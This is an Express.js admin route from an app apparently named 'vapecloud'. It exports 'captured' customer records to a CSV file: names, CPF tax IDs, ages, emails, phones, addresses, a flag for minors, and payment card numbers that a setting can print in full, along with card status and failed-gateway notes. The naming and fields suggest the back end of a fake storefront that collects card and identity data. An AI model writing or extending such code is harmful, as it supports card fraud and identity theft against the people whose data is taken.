app.get('/api/admin/export',requireAdmin,(req,res)=>{ const gw=c=>c.gateway?(c.gateway.mode+(c.gateway.ok===false?' (falhou)':'')):''; const ad=c=>{const e=c.cliente?.endereco||{};return [e.cep,e.logradouro,e.numero,e.complemento,e.bairro,e.cidade,e.uf].join(' - ').trim()}; const rows=[['seq','tipo','status','cartao_status','cartao_motivo','gateway','nome','cpf','idade','email','telefone','documento','endereco','total','menor','ts']].concat(store.captures.map(c=>{const cl=c.cliente;const pay=c.card?(c.card.brand+' '+fmtPan(c.card.num,!store.config.full_pan!==false)):(c.pix?('PIX '+c.pix.id):''); return [c.seq,c.tipo,c.status||'',c.cardStatus||'',c.cardNote||'',gw(c),cl.nome,cl.cpf,cl.idade,cl.email,cl.telefone,pay,ad(c),c.total,c.menor?1:0,new Date(c.ts).toISOString()]})); const csv=rows.map(r=>r.map(x=>'"'+String(x??'').replace(/"/g,'""')+'"').join(',')).join('\n'); res.setHeader('Content-Type','text/csv; charset=utf-8'); res.setHeader('Content-Disposition','attachment; filename=vapecloud-capturas.csv'); res.send('\ufeff'+csv) })

